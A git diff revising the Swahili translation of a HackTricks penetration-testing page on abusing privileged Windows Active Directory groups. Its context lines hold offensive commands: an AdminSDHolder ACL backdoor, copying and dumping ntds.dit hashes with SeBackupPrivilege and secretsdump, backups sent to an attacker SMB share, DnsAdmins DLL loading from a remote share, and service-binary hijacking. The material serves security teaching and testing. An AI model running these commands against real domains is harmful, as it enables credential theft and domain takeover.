@@ -1,16 +1,16 @@
-# Privileged Groups
+# Vikundi vya Kipekee
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Well Known groups with administration privileges
+## Vikundi Vinavyojulikana vyenye mamlaka ya usimamizi
 
-- **Administrators**
-- **Domain Admins**
-- **Enterprise Admins**
+- **Wasimamizi**
+- **Wasimamizi wa Kikoa**
+- **Wasimamizi wa Biashara**
 
-## Account Operators
+## Opereta wa Akaunti
 
-Kikundi hiki kina uwezo wa kuunda akaunti na vikundi ambavyo si wasimamizi kwenye kikoa. Aidha, kinaruhusu kuingia kwa ndani kwenye Domain Controller (DC).
+Kikundi hiki kina uwezo wa kuunda akaunti na vikundi ambavyo si wasimamizi kwenye kikoa. Aidha, kinaruhusu kuingia kwa ndani kwenye Kituo cha Kikoa (DC).
 
 Ili kubaini wanachama wa kikundi hiki, amri ifuatayo inatekelezwa:
 ```powershell
@@ -30,7 +30,7 @@ Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
 Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
 Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
 ```
-Inapatikana skripti ili kuharakisha mchakato wa urejeleaji: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).
+Inapatikana skripti ya kuharakisha mchakato wa urejeleaji: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).
 
 Kwa maelezo zaidi, tembelea [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).
 
@@ -46,7 +46,7 @@ Ufikiaji wa faili kwenye DC umewekwa mipaka isipokuwa mtumiaji ni sehemu ya kund
 
 ### Kuinua Haki
 
-Kwa kutumia `PsService` au `sc` kutoka Sysinternals, mtu anaweza kukagua na kubadilisha ruhusa za huduma. Kundi la `Server Operators`, kwa mfano, lina udhibiti kamili juu ya huduma fulani, linalowezesha utekelezaji wa amri za kiholela na kuinua haki:
+Kwa kutumia `PsService` au `sc` kutoka Sysinternals, mtu anaweza kukagua na kubadilisha ruhusa za huduma. Kundi la `Server Operators`, kwa mfano, lina udhibiti kamili juu ya huduma fulani, linalowezesha utekelezaji wa amri zisizo na mipaka na kuinua haki:
 ```cmd
 C:\> .\PsService.exe security AppReadiness
 ```
@@ -74,7 +74,7 @@ Import-Module .\SeBackupPrivilegeCmdLets.dll
 Set-SeBackupPrivilege
 Get-SeBackupPrivilege
 ```
-3. Pata na nakili faili kutoka kwa saraka zilizo na vizuizi, kwa mfano:
+3. Pata na nakili faili kutoka kwa saraka zilizozuiliwa, kwa mfano:
 ```bash
 dir C:\Users\Administrator\
 Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
@@ -102,7 +102,7 @@ exit
 ```cmd
 Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
 ```
-Mbali na hayo, tumia `robocopy` kwa ajili ya nakala za faili:
+Vinginevyo, tumia `robocopy` kwa ajili ya nakala za faili:
 ```cmd
 robocopy /B F:\Windows\NTDS .\ntds ntds.dit
 ```
@@ -117,7 +117,7 @@ secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
 ```
 #### Kutumia wbadmin.exe
 
-1. Sanidi mfumo wa faili wa NTFS kwa seva ya SMB kwenye mashine ya mshambuliaji na uhifadhi akiba ya akreditivu za SMB kwenye mashine lengwa.
+1. Weka mfumo wa faili wa NTFS kwa ajili ya seva ya SMB kwenye mashine ya mshambuliaji na uhifadhi akiba ya akidi za SMB kwenye mashine lengwa.
 2. Tumia `wbadmin.exe` kwa ajili ya akiba ya mfumo na uchimbaji wa `NTDS.dit`:
 ```cmd
 net use X: \\<AttackIP>\sharename /user:smbuser password
@@ -132,13 +132,13 @@ Kwa maonyesho ya vitendo, angalia [DEMO VIDEO WITH IPPSEC](https://www.youtube.c
 
 Wajumbe wa kundi la **DnsAdmins** wanaweza kutumia mamlaka yao kupakia DLL isiyo na mipaka yenye mamlaka ya SYSTEM kwenye seva ya DNS, mara nyingi inayoendeshwa kwenye Wasimamizi wa Kikoa. Uwezo huu unaruhusu uwezekano mkubwa wa unyakuzi.
 
-Ili orodhesha wajumbe wa kundi la DnsAdmins, tumia:
+Ili kuorodhesha wajumbe wa kundi la DnsAdmins, tumia:
 ```powershell
 Get-NetGroupMember -Identity "DnsAdmins" -Recurse
 ```
-### Teua DLL isiyokuwa na mipaka
+### Teua DLL isiyokuwa na mipango
 
-Wajumbe wanaweza kufanya seva ya DNS ipakue DLL isiyokuwa na mipaka (iwe kwa ndani au kutoka kwa sehemu ya mbali) kwa kutumia amri kama:
+Wajumbe wanaweza kufanya seva ya DNS kupakia DLL isiyokuwa na mipango (iwe kwa ndani au kutoka kwa sehemu ya mbali) kwa kutumia amri kama:
 ```powershell
 dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
 dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
@@ -173,7 +173,7 @@ Pia inawezekana kutumia mimilib.dll kwa ajili ya utekelezaji wa amri, kuibadilis
 
 DnsAdmins wanaweza kubadilisha rekodi za DNS ili kufanya shambulio la Man-in-the-Middle (MitM) kwa kuunda rekodi ya WPAD baada ya kuzima orodha ya kuzuia maswali ya kimataifa. Zana kama Responder au Inveigh zinaweza kutumika kwa ajili ya kudanganya na kukamata trafiki ya mtandao.
 
-### Wasilishi wa Kumbukumbu za Matukio
+### Wasomaji wa Kumbukumbu za Matukio
 Wajumbe wanaweza kufikia kumbukumbu za matukio, huenda wakapata taarifa nyeti kama nywila za maandiko au maelezo ya utekelezaji wa amri:
 ```powershell
 # Get members and search logs for sensitive information
@@ -189,11 +189,11 @@ Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
 ```
 ## Wataalam wa Hyper-V
 
-Wataalam wa Hyper-V wana ufikiaji kamili wa Hyper-V, ambayo inaweza kutumika kuteka udhibiti wa Wataalam wa Kikoa wa virtualized. Hii inajumuisha kunakili DCs za moja kwa moja na kutoa NTLM hashes kutoka kwa faili ya NTDS.dit.
+Wataalam wa Hyper-V wana ufikiaji kamili wa Hyper-V, ambao unaweza kutumiwa kupata udhibiti wa Wataalam wa Kikoa wa virtualized. Hii inajumuisha kunakili DCs za moja kwa moja na kutoa NTLM hashes kutoka kwa faili ya NTDS.dit.
 
 ### Mfano wa Kutumia
 
-Huduma ya Matengenezo ya Mozilla ya Firefox inaweza kutumika na Wataalam wa Hyper-V kutekeleza amri kama SYSTEM. Hii inahusisha kuunda kiungo kigumu kwa faili ya SYSTEM iliyolindwa na kuibadilisha na executable mbaya:
+Huduma ya Matengenezo ya Mozilla ya Firefox inaweza kutumiwa na Wataalam wa Hyper-V kutekeleza amri kama SYSTEM. Hii inahusisha kuunda kiungo kigumu kwa faili ya SYSTEM iliyolindwa na kuibadilisha na executable mbaya:
 ```bash
 # Take ownership and start the service
 takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
@@ -209,7 +209,7 @@ Katika mazingira ambapo **Microsoft Exchange** imewekwa, kundi maalum linalojuli
 
 #### Opereta wa Print
 
-Wajumbe wa kundi la **Opereta wa Print** wanapewa haki kadhaa, ikiwa ni pamoja na **`SeLoadDriverPrivilege`**, ambayo inawaruhusu **kuingia kwa ndani kwenye Kituo cha Kikoa**, kuzima, na kusimamia printa. Ili kutekeleza haki hizi, hasa ikiwa **`SeLoadDriverPrivilege`** haionekani chini ya muktadha usio na hadhi, kupita Udhibiti wa Akaunti ya Mtumiaji (UAC) ni muhimu.
+Wajumbe wa kundi la **Opereta wa Print** wanapewa haki kadhaa, ikiwa ni pamoja na **`SeLoadDriverPrivilege`**, ambayo inawaruhusu **kuingia kwa ndani kwenye Kidhibiti cha Kikoa**, kuifunga, na kusimamia printa. Ili kutekeleza haki hizi, hasa ikiwa **`SeLoadDriverPrivilege`** haionekani chini ya muktadha usio na kiwango, kupita Udhibiti wa Akaunti ya Mtumiaji (UAC) ni muhimu.
 
 Ili kuorodhesha wajumbe wa kundi hili, amri ifuatayo ya PowerShell inatumika:
 ```powershell
@@ -233,11 +233,11 @@ Wajumbe wanaweza kufikia PCs kupitia **Windows Remote Management (WinRM)**. Uhes
 Get-NetGroupMember -Identity "Remote Management Users" -Recurse
 Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
 ```
-Kwa mbinu za unyakuzi zinazohusiana na **WinRM**, nyaraka maalum zinapaswa kutazamwa.
+Kwa mbinu za unyakuzi zinazohusiana na **WinRM**, nyaraka maalum zinapaswa kutumika.
 
-#### Watoa Huduma wa Seva
+#### Watoa Huduma za Seva
 
-Kikundi hiki kina ruhusa za kufanya usanidi mbalimbali kwenye Wajibu wa Kikoa, ikiwa ni pamoja na ruhusa za kuhifadhi na kurejesha, kubadilisha muda wa mfumo, na kuzima mfumo. Ili kuhesabu wanachama, amri iliyotolewa ni:
+Kikundi hiki kina ruhusa za kufanya usanidi mbalimbali kwenye Wajibu wa Kikoa, ikiwa ni pamoja na ruhusa za kuhifadhi na kurejesha, kubadilisha muda wa mfumo, na kuzima mfumo. Ili kuorodhesha wanachama, amri iliyotolewa ni:
 ```powershell
 Get-NetGroupMember -Identity "Server Operators" -Recurse
 ```
